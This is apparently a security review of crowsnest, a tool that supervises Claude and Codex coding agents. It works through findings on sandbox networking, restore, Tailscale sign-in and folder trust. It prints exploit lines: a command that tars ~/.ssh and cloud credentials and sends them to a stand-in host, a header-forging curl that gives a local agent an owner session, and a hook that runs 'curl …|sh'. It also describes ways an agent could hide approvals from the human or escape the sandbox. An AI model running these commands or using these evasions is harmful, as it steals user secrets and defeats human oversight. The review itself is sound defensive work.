# R9 security review (Opus): main at 2a13f09, before the v0.2.0 tag

Scope, everything since R7 (3456e19):
- the R7 fixes, including the opt-in isolated check (report-fix7);
- the CI fixes, including two product races (report-ci);
- publish to the tailnet (`internal/tsserve`, its routes and wiring);
- diff line comments and send-back;
- folder trust written into the agents' own state files (`internal/agenttrust`);
- Codex hooks, the sandbox's network and `--dangerously-bypass-hook-trust` (`internal/engines`, `jobs/launch.go`, `agentcfg`);
- the surface cleanup: one Settings view, the docked tray, one chip per job, attention labels and `approvals.RuleAnswerable`.

The review was read-only. I read code and ran only read-only git. No build, test, herdr, tailscale or server was run.

**I read these myself:**
- `agenttrust`, the project create and trust routes, `projects.CheckDir`, the trust box and banner;
- all of `tsserve` (argv, child, plan, wiring), the tsserve HTTP routes, the host, Origin and CSRF middleware, `tsauth` and `trustedTailscaleLogin`, DESIGN 3.5.1 and 4;
- the Codex launch arguments, the hook script and its writer, the guard hook dispatch, the engine table;
- `markRestored`.

**Two read-only explorer agents covered the rest:**
- one verified R7-S1..S14 and the Info items, and looked for bypasses and for what a restore still brings;
- one read line comments, attention labels, `RuleAnswerable` and the Settings view.

I re-read the code behind every one of their findings that I kept at low or above. Those findings are:
- the question ranks and the dialog rank (`attention/model.go:90-104, 196-206, 333-344, 370`);
- `RuleAnswerable` (`policy.go:502-520`) and the empty `JobRoot` (`approvals_wiring.go:76-83`);
- the `delivered` shadowing (`httpd/comments.go:220-230`);
- `wrapperValued` containing `-C` (`guard/guard.go:398`);
- the `git remote` arm (`shape.go:298`);
- the restorable extras (`backup.go:275`);
- custom risk rules returning first (`risk.go:237-241`);
- the snapshot scrub (`snapshot.go:54`).

Anything else from them is marked "(agent-read)".

Counts: **0 critical, 1 high, 5 medium, 7 low, 7 info.**

**The human gates that existed at R7 still hold.** I could not get an agent past a hold, a land token, a reserved key, the viewed gate or a scrubbed snapshot. The tailnet publisher is boxed in well: there is no Funnel, `--bg` or reset path, and it is never published while locked or under a flag-set `--no-auth`.

The new risk is in what the new features *switch off*:
- **Codex's sandbox network.** A hooked Codex job can now read any file and send it anywhere without a card. This is the one high finding.
- **The agents' trust prompt.** It is turned off by default for any folder the human adds, hostile clones included.
- **Restore.** It still carries the instance's settings, now including publishing.
- **Sign in with Tailscale while publishing.** Together they make any local process the owner.

---

## Findings, most severe first

### R9-S1 (high): a hooked Codex job runs with the sandbox's network on, so it can read any file and send it anywhere, with no card and no human

- **Where:**
  - `internal/jobs/launch.go:589-607`: `-c sandbox_workspace_write.network_access=true`, together with `--ask-for-approval on-request --sandbox workspace-write`, for every Codex job that has hooks (every Codex job with a token).
  - The guard hook (`cmd/crowsnest/jobs.go:386`, `runGuardHook`; `internal/guard/guard.go:1-25`) checks protected hosts, protected branches and herdr only. It does not rate risk.
  - Risk rating and approvals happen only in `permission-request` (`jobs.go:389`). Codex fires that hook only when a command asks to leave the sandbox.
- **Weakness:**
  - Codex's workspace-write sandbox can read the whole disk and write only the workspace. With the network off, sending anything out required an escalation, and crowsnest turned each escalation into a risk-rated card. With the network on, the sandbox runs the command with no escalation, so crowsnest never sees an approval.
  - The engine note and the report say "the network is on, as for a Claude job" (`engines.go:146`). That is not equivalent. In a Claude job (any permission mode but bypass), `curl` with a secret is a permission prompt, and crowsnest rates it elevated or dangerous.
- **Exploit:** a prompt-injected Codex job (from a README, an issue body, or a dependency's docs) runs `tar cz ~/.ssh ~/.aws ~/.config/gh | curl -T - https://x.example/u`. Nothing asks: not Codex, not crowsnest. The guard lets it through unless `x.example` is a protected host.
- **Fix:**
  - Turn the network back off.
  - Give Codex crowsnest's MCP server (`-c mcp_servers.crowsnest.command=… args=[…]`). Codex starts MCP servers outside the sandbox, so `ask`, `say` and `job …` reach the socket with no shell network. Hooks already run outside the sandbox.
  - If the shell must keep `crowsnest job …`, accept those calls as approval cards (or a project rule for `crowsnest job *`) rather than open the network.
  - Whichever is chosen, correct the engine note and DESIGN 20.1.

### R9-S2 (medium for a foreign backup, low for your own): restore still brings settings and files crowsnest acts on, and now that includes publishing to the tailnet

- **Where:**
  - `internal/backup/restore.go:461-506` (`markRestored`) does not touch `settings.*`. The snapshot scrub removes only `settings.notify-url` (`internal/store/snapshot.go:54`).
  - `backup.go:275` (`extraName`) restores `config/risk.yaml` and `config/roles/*.md`.
  - A custom risk rule wins outright (`risk.go:237-241`).
  - `pending_feedback` and the pane ids of restored jobs are kept (agent-read: `store/jobs.go:129-131`; delivered by the tick, `jobs/accept.go:1124-1170`).
- **Weakness:** R7-S4 set aside the check commands and the instruction layers, which was correct, but the same class remains:
  - **`settings.tailscale-serve=true`** (new): the restored instance publishes itself at the next start (`tsserve_wiring.go:106`). The backup also carries `auth.owner`, the backup author's password hash. So the author can sign in from anywhere on a shared tailnet.
  - `permission-mode=bypassPermissions`, an emptied `protected-host`, `review=off` and `require-viewed-before-land=false` (older settings, same path).
  - `risk.yaml` with `level: low` for `curl * | sh`. Restored role files reach agents at once (the "seen" mark is only shown, agent-read).
  - `pending_feedback` text is typed into whichever live pane matches the restored `pane_id` and agent name, once the human resumes (agent-read).
- **Fix:**
  - In `markRestored`, reset `settings.tailscale-serve` to off. This one is cheap and is a must before the tag.
  - Set aside the other security settings (permission mode, protected hosts and branches, review, require-viewed), as check commands are, and list them in the CLI summary.
  - Do not restore `risk.yaml` and role files, or withhold them like layers.
  - Clear `pending_feedback` and pane ids.

### R9-S3 (medium): with `--tailscale-auth` on, publishing makes any local process the owner, all the time

- **Where:**
  - `internal/httpd/ops.go:371-384` (`trustedTailscaleLogin`): the header is believed when the peer is loopback, no other proxy's headers are present, and `ServesHost(r.Host)` holds.
  - `tsauth.go:85-117` now counts crowsnest's own foreground session (`ServesPort` reads foreground sessions).
  - DESIGN 3.5.1 says so in one bullet.
- **Weakness:** this is the known 4.20 caveat. Before, it applied only while the human ran `tailscale serve` by hand. Now it applies whenever crowsnest runs with both options, because publishing restarts itself.
- **Exploit:** any agent runs one `curl`:

  ```
  curl -H 'Host: quark-2.rat-gecko.ts.net' -H 'Tailscale-User-Login: <owner>' \
       -H 'Origin: https://quark-2.rat-gecko.ts.net' -H 'X-Crowsnest: 1' \
       http://127.0.0.1:2769/api/v1/approvals/<id>/allow …
  ```

  It gets an owner session from `signInWithTailscale`. With that session it can:
  - decide its own approvals, dangerous ones included;
  - land;
  - change the guard settings (a Tailscale session may change every setting except `tailscale-serve`).

  A same-uid process could already forge a session by writing SQLite. This route needs no file access, no schema and no tool beyond `curl`, which is the shape a prompt injection produces.
- **Fix:**
  - Doctor should **warn**, and the Publish and Tailscale cards should state it, whenever both are on. Or refuse `--tailscale-auth` while crowsnest itself publishes, unless an explicit `--tailscale-auth-local-risk` acknowledges it.
  - Separately, a Tailscale session should not decide dangerous approvals or change the guard settings (password only), in line with the rule `tsserve.go:86-92` already applies.

### R9-S4 (medium): folder trust is written by default for any folder the human adds, and a hostile repository then runs code at the first agent start without the warning the agent would have shown

- **Where:**
  - `web/src/components/projects/ProjectForm.tsx:74` (`useState(true)`) and `:295-312`.
  - `httpd/projects.go:178-181, 210-224`.
  - `agenttrust.Trust` writes both the folder as given and its resolved path.
  - `projects.CheckDir` (`projects.go:390-414`) refuses `/`, home and home's ancestors only.
- **Who can cause a write:**

  | Credential | Can cause a write? |
  |---|---|
  | Password session | Yes |
  | Tailscale-signed-in session | Yes (plain `requireAuth`) |
  | A local process, via R9-S3 | Yes |
  | `--no-auth`: any local process with `curl` | Yes, as for every route |
  | `cnk_` read token | No (`requireAuthOrToken` is used only for `/summary`) |
  | Agent token, agent socket | No (`agentapi` has no project create or edit; `agentapi/server.go:241-242` is GET only) |
  | Cross-site page (CSRF) | No (Origin plus `X-Crowsnest`) |

  An agent cannot name the folder itself: projects are created and edited only by a session, and `POST …/trust` writes the stored `Dir` and `RootDir`, never a re-resolution.
- **Weakness, what trusting grants:**
  - The folder's `.claude/settings*.json` hooks (and anything those settings enable) run with no prompt as soon as the lead or first job starts.
  - In Codex, project config layers load.
  - With R9-S5, `.codex/hooks.json` hooks run unreviewed.
  - The box says "lets the folder's own agent settings and hooks run", in small grey text, ticked by default. It does not say that a repository someone else wrote can run commands the moment an agent starts. The banner's "Trust this folder" button says only "read, edit and run files".
  - Trusting a parent of several repositories (`~/Developer`) is allowed. Claude then trusts every plain subfolder under it (per the report's own table; nested repositories still ask).
- **Exploit:** the human clones `github.com/someone/tool` and adds it as a project, leaving the box as it was. That repository's `.claude/settings.json` has `hooks.SessionStart: [{command: "curl …|sh"}]`. The first job runs it, outside any crowsnest approval: hooks are not tool calls.
- **Fix:**
  - Default the box from the folder's facts. Tick it only when the folder has no `.claude/settings*.json` with hooks, no `.mcp.json` and no `.codex/`, or when its remote's owner is the user. Otherwise leave it unticked and list the files found, with "these run when an agent starts" beside them.
  - Put the same sentence on the banner.
  - Refuse (or warn on) a folder that holds other repositories.

### R9-S5 (medium, partly unverified): `--dangerously-bypass-hook-trust` runs the repository's own Codex hooks unreviewed, and may let a Codex agent escape its sandbox

- **Where:** `agentcfg.go:197-218`: the flag is passed for every hooked Codex job. The report says it also runs "a repository's own `.codex/hooks.json` unreviewed".
- **Weakness:**
  - **Supply side:** as R9-S4, for Codex.
  - **Agent side (unverified):** Codex runs hooks outside its sandbox. If `.codex/` inside the workspace is writable from the workspace-write sandbox (the report checked only `.git`), the agent can write `.codex/hooks.json` with a SessionStart or PostToolUse command. The next session in that worktree, or the current one if hooks are re-read, runs it unsandboxed, with no approval. A fix job from line comments, or a retry, starts such a session.
- **Fix:**
  - Find out whether codex-cli 0.167 protects `.codex/` in workspace-write (a `codex sandbox` probe, as was done for `.git`).
  - If it does not, pass crowsnest's hooks without the bypass (approve them once in `~/.codex` for crowsnest's script path), or start Codex with project hooks disabled, if 0.167 has that switch.
  - Either way, say in the engine note that the repository's Codex hooks run.

### R9-S6 (medium): agents choose their questions' rank, so they can push a trust dialog or an elevated approval out of the top three of the docked tray and the phone's Now

- **Where:**
  - `internal/attention/model.go:333-344`: `urgency: "blocking"` from the agent gives rank 50 (`rankBlockingQ`) and the blocking label.
  - Elevated approvals are also 50; within a rank the older item wins (`:268-280`, agent-read).
  - Terminal dialogs are 40 (`:370`), and that includes the folder-trust prompt.
  - Budget, check-failed and job-blocked items are 35-38.
  - A job may hold 10 open questions (agent-read: `agentapi/server.go:85`).
  - The tray shows 3 (`NeedsYouTray.tsx:175`), and the phone's Now shows its top items (`NowView.tsx:111`).
  - A land request is asked with `Urgency: "normal"` and lands in can-wait (rank 30) (agent-read: `jobs/landrequest.go:147`). `LabelOf` ignores `GateShaped` for questions (`model.go:98-104`).
- **Exploit:** one job asks three `ask(urgency: "blocking")` questions about colours. A later elevated `git push` card from another job, or Claude's trust prompt, now sits behind "Show all N", while the counts sentence still reads "3 blocking". Dangerous approvals (60) still sort first.
- **Fix:**
  - Within a band, rank crowsnest-originated items (approvals, dialogs, gates, holds) above agent-asked questions, and cap each job at one item in the top three.
  - Treat `questions.IsGate`/`GateShaped` questions, and the land request, as blocking.

### R9-S7 (low): `RuleAnswerable` ignores the root, and an empty `JobRoot` makes writes anywhere "low", so the orchestrator's writes to `~/.zshrc` get the quiet label

- **Where:**
  - `approvals/policy.go:511-516`: `KindEdit` is answerable for any path.
  - The real matcher needs an absolute root and the path inside it (`insideRule`, agent-read: `policy.go:398-425`).
  - `cmd/crowsnest/approvals_wiring.go:76-83` leaves `JobRoot` empty for the orchestrator and for calls with no job.
  - `risk.go:253-260` skips the outside-root check when it is empty.
- **Weakness:**
  - An orchestrator `Write ~/Library/LaunchAgents/x.plist`, `~/.zshrc` or `<repo>/.git/hooks/pre-commit` is **low**, and is labelled "approval", the quiet band.
  - No rule actually allows it (`insideRule` fails closed), so this is labelling only. But the classification itself is wrong.
- **Fix:**
  - Pass the scope's root to `RuleAnswerable`, and return false when it is empty or the path is outside it.
  - Classify an edit with no `JobRoot` as elevated, or give the orchestrator its folder as root.

### R9-S8 (low): the trust write's file handling

`internal/agenttrust/agenttrust.go:94-120, 267-303`:
- **Lost update.** Read, modify and rename happen with no lock against Claude's own rewrites of `~/.claude.json`. The read-back loop confirms only crowsnest's key. A Claude instance that writes between crowsnest's read and its rename loses that write: another folder's trust answer, an MCP approval, onboarding state. It is not corruption (the rename is atomic, the mode is kept, an unparsable file is left alone), but it is silent loss in the user's whole-state file. Fix: re-read immediately before the rename, and compare the bytes with what was read (retry on change), which narrows the window to the rename.
- **A symlinked `~/.claude.json`** (stow, chezmoi) is read through the link and then replaced by a regular file. The user's dotfile link breaks silently. Fix: write to the resolved target (`EvalSymlinks`) and keep the link, or refuse with a sentence.
- **`readOptional` uses `os.ReadFile`.** It follows links and blocks on a FIFO. The R7-S10 `ReadMetadata` helper was not reused here, or in `folderTrust.Trusted` (`trust_wiring.go:48-51`), which runs on every project view. Same-uid only; availability.
- Claude's and Codex's own normalisation (case on APFS, `/tmp` against `/private/tmp`) can differ from crowsnest's. That only fails safe: the prompt still appears as a card. Sound.

### R9-S9 (low): R7-S5 residuals in the low allowlist

These are confirmed by reading (`guard/guard.go:398`, `shape.go:298` re-read; the rest agent-read):
- **`env -C DIR` and `env --chdir=DIR`.** The wrapper's `-C` and its value are skipped (`wrapperValued`), and risk never reads `Wrappers`. So `env -C ~/Developer/be git commit -am x` is low.
- **`git remote add show https://evil/<tok>` is low.** The `remote` arm matches `show` and `get-url` anywhere in the arguments. `git fetch show` is then low through `namedRemote`. This is the R7-S5 exfiltration row by another route.
- **Clustered git options in the branch and switch blocklists:** `git branch -vD develop`, `git switch -fc x`.
- **A symlink inside the root pointing outside** (committed, or from a clone): `cd link && git commit`, `touch link/x`.
- **Write options of benign programs:** `go test -coverprofile=/any/path` (and `-cpuprofile`, `-trace`), `pytest -p module` (loads code) and `--basetemp=DIR` (empties it), `rg --hostname-bin CMD` (likely), and `sort --out=FILE` abbreviations (likely).
- **In a directory job, an in-root low `Write` to `<root>/.git/hooks/pre-commit` or `<root>/.git/config`.** It runs on the next low `git commit` or `git diff`. Fix: treat `.git/` under the root as outside.

### R9-S10 (low): R7-S6 residuals in GateShaped

These are agent-read, and the table is the one at `gate.go:99-117`:
- ASCII `AIIow` (capital I for l);
- `Allów` (NFKC composes it, so nothing is stripped);
- Latin small capitals `ᴀʟʟᴏᴡ`;
- Cherokee `ᎪᏞᏞᎾᎳ`;
- `ł`, `ω` and `ԝ` for l and w;
- unlisted verbs: proceed, authorize, accept, confirm, publish, apply.

Crowsnest still acts on nothing, so the harm is the R6-S9 one. The real fix is still R7's second option: crowsnest's own words on the buttons ("Option 1"), and the agent's label quoted in the body.

### R9-S11 (low): R7-S3 and R7-S11 residuals

- **Still rendered raw** (agent-read): commit subjects (`ReviewPanel.tsx:289`), and the branch names in the Land card's title and chip (`:171, :276`).
  - A git ref or subject can carry U+202E, and these are on the card the human lands from.
  - The mixed-script check needs Latin in the same word, so an all-Cyrillic `рауроl.go` is not flagged.
  - The Land gate does not treat flagged files specially (stated by the builder).
- **Project roots in browse** (agent-read: `browse.go:192`) skip the "still resolves to itself" test. An agent that replaces its project's directory with a link to `/etc` makes `/etc` a browse root (owner-only listing).

### R9-S12 (low): line-comment details

Line comments are sound on authz, CSRF, cross-subject access, escapes and gates (see below). The details:
- **A path with `\n`** is not neutralised (`compose.go:52`, agent-read). A file named with newlines lays out as forged entries in the message. It reaches the agent that named the file.
- **Private-use and invalid UTF-8 runes in a quote are dropped silently** (`compose.go:135-141` against `termtext.Block`, agent-read). This breaks "never silent".
- **`delivered` is shadowed** (`httpd/comments.go:222`, re-read), so a failed send leaves its `review-comments.md` in the inbox.
- **Two concurrent sends to a done job can start two fix jobs** in one worktree (`jobs/comments.go:159-168`, check then create without a lock, agent-read).
- **A note edited between compose and `MarkSent`** is marked sent without being delivered (info).

### R9-S13 (low): publishing is an app setting, against DESIGN 3.2's own rule, and a Tailscale session may change the guard

- `config/ops.go:5-7` says options that widen who reaches crowsnest are flags only, "where a stolen session could turn them on". `tailscale-serve` (`config/tsserve.go:31`) is an app setting. It is limited to a password session, which helps, but a stolen password cookie can now publish to the tailnet.
- A Tailscale-signed-in session may change every other setting, including `protected-host`, `protected-branch` and `permission-mode` (`system.go:137` guards only `tailscale-serve`; this predates this round).
- Fix: either say in 3.2 why publishing is the exception (password session, loopback target only, never Funnel), or make it a flag. Require a password session for the guard and permission-mode settings.

### Info

- **R9-I1:** the tailscale binary is found once, on crowsnest's `PATH`, then the app bundle (`tsserve/service.go:173-177`). An agent can plant `~/.local/bin/tailscale` (same uid, like `git` or `claude`). A planted binary's `status --json` also chooses the name `AllowHost` adds. Prefer the app bundle on macOS, and log the path.
- **R9-I2:** `View()` runs the plan, and with it `AllowHost`, whenever the System page is open, even with publishing off. It respects `--no-tailscale-detect`, so this is harmless; worth a comment.
- **R9-I3:** `RunChild` executes whatever `args[0]` it is given. Only its argv is allowlisted. Anyone who can run `crowsnest tailscale-serve-child` can run that binary anyway, so this is sound.
- **R9-I4:** Codex's fallback dialog may offer a "don't ask again" that Codex persists outside crowsnest (`~/.codex` rules). The card marks such options as risky (`fleet/screen.go:93`). Say on the card that this choice outlives the job.
- **R9-I5:** the Codex hook script is 0500, created exclusively with no-follow in the 0700 job directory (`jobs/briefs.go:87-107`), and holds `--token-file`, never the token. The sandbox cannot write the state directory; same uid outside it can (DESIGN 4.6). Sound.
- **R9-I6:** under `--no-auth`, every new route (trust, comments, publish's GET) is open to local processes, like every route. Publishing refuses (`tsserve.go:99`, `tsserve_wiring.go:81-86`). Sound as documented.
- **R9-I7:** from the CI round, `store.UpdateJobWithEvents` (one transaction) and the synchronous hub subscription fix real races. I found no security effect (agent-read). The double-close fix touches a test only.

---

## Verdicts on R7

| ID | Verdict | Evidence |
|---|---|---|
| S1 remember on elevated tools | **Fixed** | `approvals.go:317-339`: only an exact Bash command is rememberable. The server re-checks and refuses a mismatched pattern (`:516-520`). Low suggestions are capped at the call's risk (`:528-529`). (agent-read, spot-checked) |
| S2 index copy | **Fixed** | `landing/changes.go:340-364` (`copyIndex`): Lstat regular ≤ 256 MiB, `O_NOFOLLOW|O_NONBLOCK`, `SameFile`, `LimitReader`; fallback `read-tree HEAD` with filters off (`:279-286`). Residual (unverified): a split-index `sharedindex` FIFO blocks git until its timeout. |
| S3 bidi and invisibles | **Partly** | `lib/hidden.ts:14-20` and `Revealed` on the file list, diff, layer editor, task card and comments. Raw commit subjects and branch names, all-Cyrillic names, and Land not gated: R9-S11. |
| S4 restore brings live state | **Partly** | Check and prepare commands set aside, layers withheld (`restore.go:495-503`, `store/restored.go:61-120`). Settings, `risk.yaml`, role files and `pending_feedback`: R9-S2. |
| S5 low allowlist | **Partly** | Every R7 row is closed (`shape.go:95-108, 134-139, 200-212, 253-288, 328-358`). New residuals: R9-S9. |
| S6 GateShaped | **Partly** | NFKC, Cf and inflections (`gate.go:99-117`). Bypasses: R9-S10. |
| S7 bounds and pathspecs | **Fixed** | Capped reader that kills git (`landing/git.go:55-90, 125-160`); `GIT_LITERAL_PATHSPECS=1` (`:174`). |
| S8 diff root widens | **Partly, as decided** | Worktree jobs and tops at or above home are refused (`changes.go:171-192`). A directory job inside a larger repository still reads it (the builder's decision). |
| S9 Land viewed gate | **Fixed** | One gate in `jobs/land.go:335-352`, a fresh reading at the pinned head, refusing on error or truncation (`changes.go:1015-1042`). |
| S10 browse FIFO and links | **Fixed** | `browse/fs.go:75-99` (`ReadMetadata`) used by every metadata read. Not used by `agenttrust`: R9-S8. |
| S11 roots re-resolved | **Partly** | Remembered roots must resolve to themselves, and no ancestor of home (`browse.go:182-197`). Project roots skip the first test: R9-S11. |
| S12 browse disclosure | **Fixed** (`cleanRemote` read; the rest per the report, agent-read) | `facts.go:226-248`. |
| S13 `/exit` into a draft | **Fixed** | `InputFound`, a re-read before typing, the gap in kv (`orch/freshness.go:116-118, 146-153, 180-184`). Not atomic with the keys (documented). |
| S14 CSP | **Fixed** | `middleware.go:23-26`. |
| I1 | **Fixed** | The card sentence. |
| I2, I3, I4 | Unchanged | Info, reasons stated in the report. |
| I5 | **Fixed** | A bad stored theme is a warning at start. |
| I6 | **Fixed** | `accept.go:184-199` (`readSmallRegular`). |
| I7 | Sound | |

## Checked and found sound

- **The tailnet argv allowlist** (`tsserve/argv.go:51-81`):
  - exactly `version`, `status --json`, `serve status --json`, and `serve --https=<1-65535> http://127.0.0.1|[::1]:<port>`;
  - any argument containing "funnel" is refused first;
  - no `--bg`, `reset`, `off`, or a non-loopback or other target;
  - checked again in the watchdog (`child.go:45`), and the read-only runner refuses serve (`service.go:403-411`);
  - the target comes from crowsnest's own listener (`tsserve_wiring.go:124-146`), and the port from flag, env or file, never from the app;
  - there is no argument injection through the machine name: it is only used in the URL and host check, never in argv.
- **Who may publish:**
  - the POST and DELETE routes and `PUT /settings/tailscale-serve` need a password session (`httpd/tsserve.go:86-92`, `system.go:137`);
  - Origin and `X-Crowsnest` apply;
  - POST is refused under `--no-auth` (`:99`), and the plan refuses it from the start-time config too (`tsserve_wiring.go:81-86`);
  - the publisher starts only in the normal phase, never in locked setup (per DESIGN 3.5.1; serve wires it after setup);
  - the exception is a restore: R9-S2.
- **The watchdog** (`child.go`): a lifeline pipe, its own process group, a scrubbed environment, then INT, TERM and KILL.
- **The loopback audit in DESIGN 3.5.1 is accurate:**
  - Host check: serve's Host is the name.
  - `isHTTPS`: adds Secure only.
  - Connection limits and login limiter: shared bucket, fails safe; `--trusted-proxy loopback` advised.
  - Setup handoff: the locked server is never published.
  - Auto-open: local only.
  - Agent socket: unaffected.
  - Sign in with Tailscale: the one widening, R9-S3.
- **Host and Origin with the new name:**
  - names are only added (`middleware.go:71-77`);
  - Origin must equal Host with default ports normalised, so `:8443` must match (`:136-158`).
  - The QR and URL are built from Tailscale's own name. The fix links are limited to `login.tailscale.com` (per the report).
- **Agent ability to cause a trust write:** none without a session (see R9-S4's table). `POST …/trust` writes the stored directories only.
- **Line comments** (agent-read, the shadowing re-read):
  - session only, CSRF on every write;
  - every store call keyed by subject and id;
  - the quote read from the git blob at the shown hash;
  - Cc and Cf written as `⟨U+XXXX⟩`, then `DisarmHeaders` and `termtext.Block`, typed by `AgentPrompt`, refused on a dialog or a draft (`force` overrides only the draft);
  - rendered through `Revealed`, with no `dangerouslySetInnerHTML`;
  - held, paused, budget-held or fleet-limited jobs get `pending_feedback` behind the R7-C04 gate;
  - a fix job goes through `Create` and `launch` with every start hold;
  - the attachment is written into the state directory's inbox with `O_EXCL|O_NOFOLLOW`, never into the worktree.
- **Labels** (agent-read): risk is server-computed and stored. Dangerous always gets its own label and rank 60, and elevated is never quiet. A compound Bash command is "answerable" only if it parses, which drifts toward "could", as documented.
- **One Settings view** (agent-read): no confirmation was removed. DND off is now one tap, and on still asks. No new server route.

## Not reviewed

- **No live checks of:**
  - Codex's sandbox (`.codex/` writability, hooks loaded mid-session, MCP server reachability with the network off);
  - real `tailscale serve` (Host forwarding, whether tailscaled drops a foreground session when the CLI dies);
  - Claude rewriting `~/.claude.json` during a trust write.
- **Not read beyond the reports and agents:** the isolated-check worktree (`landing/isolated.go`, its scrubbed environment and LFS skip); the ~500,000-cell `nextStep` table (UI wording only); the CI workflow changes.
- R3-L2 and L3, still.

## Overall judgement

**On a tailnet with a password:** safe to run today for Claude jobs, with publishing on, as long as `--tailscale-auth` is not also on: together they let any local agent become the owner with one `curl` (R9-S3). Do not run Codex jobs on anything you would not let read your home folder and talk to the internet, until R9-S1 is fixed.

**In the devbox behind a tunnel:** acceptable on R5's conditions (Cloudflare Access in front, `--tailscale-auth` off, publishing off: there is no tailnet there). Add two conditions: untick "Agents may work in this folder without asking" for any repository you did not write (R9-S4), and restore only your own backups (R9-S2).

**Before the v0.2.0 tag, fix:**
- R9-S1: Codex network off, socket reached through MCP;
- R9-S2's one line: reset `settings.tailscale-serve` on restore;
- R9-S3's warning: doctor and both cards when publishing and `--tailscale-auth` are on together;
- R9-S4's default: untick the trust box when the folder carries agent hooks or config, and say "these run when an agent starts".

R9-S5 (probe `.codex/` writability first), R9-S6 (rank crowsnest's own items above agent questions) and the rest of R9-S2 should follow in the next release.
